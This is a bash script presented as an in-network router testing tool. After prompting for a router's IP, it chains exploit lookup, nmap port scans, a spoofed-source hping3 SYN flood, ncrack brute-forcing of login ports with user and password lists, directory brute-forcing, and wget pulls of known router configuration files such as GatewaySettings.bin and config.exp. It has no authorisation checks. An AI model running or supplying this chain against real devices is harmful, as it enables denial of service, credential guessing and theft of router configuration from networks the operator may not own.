#!/bin/bash
#This script is made for scanning and testing the router from inside the network.
echo "What is the router internal IP?"
read IIP
echo "What is the manufacturer?"
read MAN
echo "Start searching manufacturer exploits? y / n"
read MANEX
if [ $MANEX == "y" ]
    then
searchsploit router $MAN
fi

echo "Start TCP port testing? y / n"
read TCPPT
if [ $TCPPT == "y" ]
    then
sudo nmap -Pn $IIP
sudo nmap -p- $IIP
sudo nmap -sS -sV  $IIP
# Here you can add or remove any nmap scan you wish.
fi

echo "Start Ping Flood testing? y / n"
read PFT
if [ $PFT == "y" ]
    then
echo "what port number you wish tested?"
read PFPN
hping3 -V -c 1000000 -d 120 -S -p $PFPN --flood --rand-source $IIP
fi

echo "Start Port Bruteforcing? y / n"
read PBT
if [ $PBT == "y" ]
    then
echo "What port number you want tested?"
read PN
echo "What username list file / path you want used?"
read UL
echo "What password list file / path you want used?"
read PL
ncrack -p $PN -U $UL -P $PL $IIP
fi

echo "Start router architecture testing? y / n"
read RAT
if [ $RAT == "y" ]
    then
dirb http://$IIP
fi

echo "Start testing router file extraction? y / n"
read FE
if [ $FE == "y" ]
    then
wget -q -O - http://$IIP/goform/system/GatewaySettings.bin
wget -q -O - http://$IIP/router.data
wget -q -O - http://$IIP/cgi-bin/config.exp
wget -q -O - http://$IIP/cgi/cgi_status.js
# Here you can add or remove any directory or file you wish try to extract from the router.
fi

echo "Start testing with Nikto? y / n"
read NKT
if [ $NKT == "y" ]
    then
nikto -h $IIP
fi
